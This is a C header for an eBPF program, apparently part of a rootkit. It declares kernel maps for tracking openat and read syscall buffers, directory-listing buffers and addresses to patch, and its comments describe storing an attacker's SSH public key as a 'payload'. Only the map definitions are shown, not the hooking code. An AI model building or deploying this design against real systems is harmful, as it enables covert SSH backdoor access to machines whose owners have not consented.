#include "./common.h"

#ifndef __MAP__
#define __MAP__

// Report Events
// Ringbuffer Map to pass messages from kernel to user
// No Event Struct no Ringbuffer.
struct
{
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct event
{
    int pid;
    u8 comm[TASK_COMM_LEN];
    bool success;
};

// Dummy instance to get skeleton to generate definition for `struct event`
struct event _event = {0};

// Map to hold the File Descriptors from 'openat' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);         // key is pid_tgid
    __type(value, unsigned int); // value are always zero.
} map_fds SEC(".maps");

//  struct to store the buffer mem id and buffer
struct syscall_read_logging
{
    long unsigned int buffer_addr; // char buffer pointer addr
    long int calling_size; // read(size) store the size.
};

// // Map to fold the buffer sized from 'read' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);              // key is pid_tgid
    // __type(value, long unsigned int); // char buffer pointer location
    __type(value, struct syscall_read_logging);
} map_buff_addrs SEC(".maps");


// struct defined custom_payload to get usermode ssh key string
struct custom_payload
{
    u8 raw_buf[MAX_PAYLOAD_LEN];
    u32 payload_len;
};

// __EXPORTED_DEFINE(custom_payload, unused2);
// Map to hold the hackers key ssh keys.
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u8);                    // key is id
    __type(value, struct custom_payload ); // value is ssh pub key
} map_payload_buffer SEC(".maps");


// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

#endif
